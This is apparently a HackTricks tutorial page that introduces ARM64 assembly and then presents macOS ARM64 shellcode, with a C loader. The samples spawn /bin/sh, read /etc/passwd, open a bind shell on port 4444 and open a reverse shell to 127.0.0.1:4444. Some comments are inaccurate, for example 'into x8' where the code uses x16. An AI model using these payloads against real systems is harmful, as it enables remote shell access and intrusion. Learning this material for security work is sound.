# Introduction to ARM64

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Introduction to ARM64**

ARM64, also known as ARMv8-A, is a 64-bit processor architecture used in various types of devices including smartphones, tablets, servers, and even some high-end personal computers (macOS). It's a product of ARM Holdings, a company known for its energy-efficient processor designs.

### **Registers**

ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.

1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
   * **`x0`** also carries the return data of a function
2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
4. **`x16`** and **`x17`** - Temporary registers, also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
   * **`x16`** is used as the **system call number** for the **`svc`** instruction.
5. **`x18`** - Platform register. On some platforms, this register is reserved for platform-specific uses.
6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller.
7. **`x29`** - **Frame pointer**.
8. **`x30`** - Link register. It holds the return address when a `BL` (Branch with Link) or `BLR` (Branch with Link to Register) instruction is executed.
9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.
10. **`pc`** - **Program counter**, which points to the next instruction to be executed.

### **Calling Convention**

The ARM64 calling convention specifies that the **first eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if it's 128 bits**. The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.

When reading a function in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring the saved frame pointer** and **returning** from the function.

### **Common Instructions**

ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination** register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values can also be used in place of source registers.

* **`mov`**: **Move** a value from one **register** to another.
  * Example: `mov x0, x1` — This moves the value from `x1` to `x0`.
* **`ldr`**: **Load** a value from **memory** into a **register**.
  * Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.
* **`str`**: **Store** a value from a **register** into **memory**.
  * Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.
* **`ldp`**: **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
  * Example: `ldp x0, x1, [x2]` — This loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.
* **`stp`**: **Store Pair of Registers**. This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
  * Example: `stp x0, x1, [x2]` — This stores `x0` and `x1` to the memory locations at `x2` and `x2 + 8`, respectively.
* **`add`**: **Add** the values of two registers and store the result in a register.
  * Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together and stores the result in `x0`.
* **`sub`**: **Subtract** the values of two registers and store the result in a register.
  * Example: `sub x0, x1, x2` — This subtracts the value in `x2` from `x1` and stores the result in `x0`.
* **`mul`**: **Multiply** the values of **two registers** and store the result in a register.
  * Example: `mul x0, x1, x2` — This multiplies the values in `x1` and `x2` and stores the result in `x0`.
* **`div`**: **Divide** the value of one register by another and store the result in a register.
  * Example: `div x0, x1, x2` — This divides the value in `x1` by `x2` and stores the result in `x0`.
* **`bl`**: **Branch** with link, used to **call** a **subroutine**. Stores the **return address in `x30`**.
  * Example: `bl myFunction` — This calls the function `myFunction` and stores the return address in `x30`.
* **`blr`**: **Branch** with Link to Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address in `x30`.
  * Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the return address in `x30`.
* **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.
  * Example: `ret` — This returns from the current subroutine using the return address in `x30`.
* **`cmp`**: **Compare** two registers and set condition flags.
  * Example: `cmp x0, x1` — This compares the values in `x0` and `x1` and sets the condition flags accordingly.
* **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.
  * Example: `b.eq label` — If the previous `cmp` instruction found two equal values, this jumps to `label`.
* **`b.ne`**: **Branch if Not Equal**. This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared values were not equal, it branches to a label or address.
  * Example: After a `cmp x0, x1` instruction, `b.ne label` — If the values in `x0` and `x1` were not equal, this jumps to `label`.
* **`cbz`**: **Compare and Branch on Zero**. This instruction compares a register with zero, and if they are equal, it branches to a label or address.
  * Example: `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. This instruction compares a register with zero, and if they are not equal, it branches to a label or address.
  * Example: `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.
* **`adrp`**: Compute the **page address of a symbol** and store it in a register.
  * Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.
* **`ldrsw`**: **Load** a signed **32-bit** value from memory and **sign-extend it to 64** bits.
  * Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
* **`stur`**: **Store a register value to a memory location**, using an offset from another register.
  * Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
* &#x20;**`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.
  *   Example:&#x20;

      ```armasm
      mov x8, 93  ; Load the system call number for exit (93) into register x8.
      mov x0, 0   ; Load the exit status code (0) into register x0.
      svc 0       ; Make the system call.
      ```

### **Function Prologue**

1.  **Save the link register and frame pointer to the stack**:

    {% code overflow="wrap" %}
    ```armasm
    stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
    ```
    {% endcode %}
2. **Set up the new frame pointer**: `mov x29, sp` (sets up the new frame pointer for the current function)
3. **Allocate space on the stack for local variables** (if needed): `sub sp, sp, <size>` (where `<size>` is the number of bytes needed)

### **Function Epilogue**

1. **Deallocate local variables (if any were allocated)**: `add sp, sp, <size>`
2.  **Restore the link register and frame pointer**:

    {% code overflow="wrap" %}
    ```armasm
    ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
    ```
    {% endcode %}
3. **Return**: `ret` (returns control to the caller using the address in the link register)

## macOS

### syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).

### Shellcodes

To compile:

```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```

To extract the bytes:

```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\\x'$c
done
```

<details>

<summary>C code to test the shellcode</summary>

```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
 
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    printf("[+] SUCCESS: mmap\n");
    printf("    |-> Return = %p\n", ptr);
 
    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
    printf("[+] SUCCESS: memcpy\n");
    printf("    |-> Return = %p\n", dst);

    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

    if (status == -1) {
        perror("mprotect");
        exit(-1);
    }
    printf("[+] SUCCESS: mprotect\n");
    printf("    |-> Return = %d\n", status);

    printf("[>] Trying to execute shellcode...\n");

    sc = ptr;
    sc();
 
    return 0;
}
```

</details>

#### Shell

Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.

{% tabs %}
{% tab title="with adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:    
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="with stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
    ; We are going to build the string "/bin/sh" and place it on the stack.
    
    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

    ; Prepare arguments for the execve syscall.
    
    mov  x1, #8       ; Set x1 to 8.
    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

    ; Make the syscall.
    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Read with cat

The goal is to execute `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, so the second argument (x1) is an array of params (which in memory these means a stack of the addresses).

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the execve syscall
    sub sp, sp, #48        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, cat_path
    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
    adr x0, passwd_path    ; Get the address of "/etc/passwd"
    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
    
    adr x0, cat_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```

#### Invoke command with sh from a fork so the main process is not killed

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the fork syscall
    mov x16, #2            ; Load the syscall number for fork (2) into x8
    svc 0                  ; Make the syscall
    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
    beq _loop              ; If not child process, loop

    ; Prepare the arguments for the execve syscall

    sub sp, sp, #64        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, sh_path
    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
    adr x0, sh_c_option    ; Get the address of "-c"
    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
    
    adr x0, sh_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


_exit:
    mov x16, #1            ; Load the syscall number for exit (1) into x8
    mov x0, #0             ; Set exit status code to 0
    svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```

#### Bind shell

Bind shell from [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) in **port 4444**

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_bind:
    /*
     * bind(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #104
    svc  #0x1337

call_listen:
    // listen(s, 2)
    mvn  x0, x3
    lsr  x1, x2, #3
    mov  x16, #106
    svc  #0x1337

call_accept:
    // c = accept(s, 0, 0)
    mvn  x0, x3
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #30
    svc  #0x1337

    mvn  x3, x0
    lsr  x2, x16, #4
    lsl  x2, x2, #2

call_dup:
    // dup(c, 2) -> dup(c, 1) -> dup(c, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

#### Reverse shell

From [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_connect:
    /*
     * connect(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    movk x1, #0x007F, lsl #32
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #98
    svc  #0x1337

    lsr  x2, x2, #2

call_dup:
    // dup(s, 2) -> dup(s, 1) -> dup(s, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
